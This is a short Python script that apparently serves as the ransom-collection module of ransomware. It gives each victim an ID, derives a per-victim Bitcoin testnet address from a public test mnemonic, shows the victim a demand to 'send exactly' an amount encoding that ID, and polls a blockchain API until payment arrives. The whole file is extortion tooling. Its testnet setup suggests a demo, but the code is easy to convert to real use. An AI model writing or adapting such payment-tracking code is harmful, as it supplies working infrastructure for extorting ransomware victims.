import sys
import random
import requests
import time
from bip_utils import (
    Bip39SeedGenerator, Bip84, Bip84Coins, Bip44Changes
)

def main():
    # Generate a victim ID (for example, 6-digit)
    victim_id = random.randint(100000, 999999)
    amount_btc = victim_id * 1e-8  # Shifted left: ID encoded in the BTC amount

    # Shared testnet mnemonic
    mnemonic = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()

    # Derive address at that victim_id index
    bip84_ctx = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN_TESTNET)
    derived = bip84_ctx.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(victim_id)
    address = derived.PublicKey().ToAddress()

    print(f"Your unique victim ID is: {victim_id}")
    print(f"Send exactly {amount_btc:.8f} BTC to this address:")
    print(f"🧾 Address: {address}")

    while True:
        try:
            url = f"https://blockstream.info/testnet/api/address/{address}"
            response = requests.get(url, timeout=10)

            if response.status_code != 200:
                print(f"Error: received status code {response.status_code}")
                time.sleep(10)
                continue

            data = response.json()
            txs = data.get("chain_stats", {}).get("funded_txo", [])
            funded = data.get("chain_stats", {}).get("funded_txo_count", 0)
            spent = data.get("chain_stats", {}).get("spent_txo_count", 0)

            if funded > spent:
                print("✅ Payment received")
                time.sleep(10)
                sys.exit(1)
            else:
                print("Waiting for payment...")
                time.sleep(10)

        except requests.RequestException as e:
            print(f"Network error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()
